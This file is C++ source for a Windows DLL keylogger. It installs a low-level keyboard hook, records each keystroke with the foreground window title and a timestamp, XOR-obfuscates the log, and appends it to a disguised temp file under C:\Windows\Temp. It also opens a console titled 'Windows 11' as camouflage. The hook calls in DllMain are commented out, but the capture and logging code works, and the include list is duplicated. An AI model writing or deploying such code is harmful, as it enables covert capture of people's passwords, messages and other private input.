#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <vector>
//#define USE_CXX_AES
//#include "AES.h"
std::string key = "ÜãHâÜHãHÉ¿âÓÖHãÜ Hâ∏Ñ«ûÑòÑ«Ñ ∏Hk¿ HçöÑH«˚HçÍHãŒHˇ*Éœ@ÈXÈ∫Ô}@å©˛ˇˇMÖÌÑ…¿uÉ}‰uÉ}u";
/*
unsigned char key[] = {
	  0x60, 0xa1, 0x42, 0x03, 0xf4, 0x05, 0x76, 0x37,
	  0x08, 0x09, 0x0a, 0x0b, 0x7c, 0x6d, 0x3e, 0x3f,
};*/

//Cipher::Aes<128> aes(key);
//std::string File;
std::ofstream output_file;
std::vector<std::string> writequeue;
//FILE* openfile = nullptr;
/*
void FlushFile() {
	//fflush(openfile);
}
void UpdateFile() {
	//fseek(openfile, 0, 0);
	//fwrite(File.c_str(), sizeof(char), File.length(), openfile);
	output_file.seekp(0);
	//output_file.clear();
	output_file << File;
	output_file.flush();
}
void UpdateString() {

}
void WriteLine(const std::string& c) {
	File += c;
	UpdateFile();
}
*/

std::string EncryptDecrypt(std::string toEncrypt) {

	std::string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++) {
		for (auto& c : key)
			output[i] ^= c;
	}

	return output;
}

void RefPtrEncrypt(std::string* toEncrypt) {
	for (int i = 0; i < toEncrypt->size(); i++) {
		for (auto& c : key)
			(*toEncrypt)[i] ^= c;
	}

}

void pPrint(std::string t, bool nl = true) {
	/*
	std::cout << t;
	if (nl) {
		std::cout << "\n";
	}*/
	printf_s(t.c_str());
	if (nl) 
		printf_s("\n");
}

const std::map<int, std::string> keyname{
	{VK_BACK, "[-\\]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	" " },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
//std::ofstream output_file;

LRESULT __declspec(dllexport) CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0 || wParam != WM_KEYDOWN)
		return CallNextHookEx(_hook, nCode, wParam, lParam);

	kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	Save(kbdStruct.vkCode);

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}



void __declspec(dllexport) CALLBACK SetHook(HINSTANCE hmod, DWORD tId)
{
	

	if (!(_hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, hmod, tId)))
	{
	
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}



int Save(int key_stroke) {
	std::stringstream output;
	static char lastwindow[256] = "";

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground) {
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);

		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			struct tm tm_info;
			time_t t = time(NULL);
			localtime_s(&tm_info, &t);
			char s[64];
			strftime(s, sizeof(s), "%FT%X%z", &tm_info);

			output << ("\n[") << (window_title) << (" | ") << (s) << ("] ");
		}
	}


	if (keyname.find(key_stroke) != keyname.end())
		output << (keyname.at(key_stroke));
	else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		if (!lowercase)
		{
			key = tolower(key);
		}
		std::string a;
		a = key;
		output << (a);
	}

	//WriteLine(output.str());

	//output_file << EncryptDecrypt(output.str());
	//output_file.flush();
	writequeue.push_back(EncryptDecrypt(output.str()));
	pPrint(output.str(), false);
	//std::cout << output.str();

	return 0;
}

bool IsSystemBooting()
{
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}
void realmain();
unsigned long __stdcall InitializeThread(void*) {

	realmain();
	while (true) {
		if (!writequeue.empty()) {
			for (auto& s : writequeue)
				output_file << s;

			writequeue.clear();
			output_file.flush();
		}
		Sleep(50);
	}
	return 0;
}
void SetupConsole() {
	AllocConsole();

	freopen_s(reinterpret_cast<_iobuf**>(__acrt_iob_func(0)), "conin$", "r", static_cast<_iobuf*>(__acrt_iob_func(0)));
	freopen_s(reinterpret_cast<_iobuf**>(__acrt_iob_func(1)), "conout$", "w", static_cast<_iobuf*>(__acrt_iob_func(1)));
	freopen_s(reinterpret_cast<_iobuf**>(__acrt_iob_func(2)), "conout$", "w", static_cast<_iobuf*>(__acrt_iob_func(2)));

	SetConsoleTitleA("Windows 11");
	pPrint("Success!");
}
void realmain()
{
	SetupConsole();

	const char* output_filename = "C:\\Windows\\Temp\\wct1A3KM23LS19PW.tmp";


	pPrint("Logging output to ", false);
	pPrint(output_filename, false);
	while (!output_file.is_open())
		output_file.open(output_filename, std::ios_base::app);


	MSG msg;

}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD call_reason, void* reserved)
{
	switch (call_reason)
	{
	case DLL_PROCESS_ATTACH:
		//SetupConsole();
		//SetHook(0, 0);

	//	if (HANDLE handle = CreateThread(nullptr, 0, InitializeThread, instance, 0, nullptr))
	//		CloseHandle(handle);
		
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		break;

	default:
		break;
	}

	return TRUE;
}
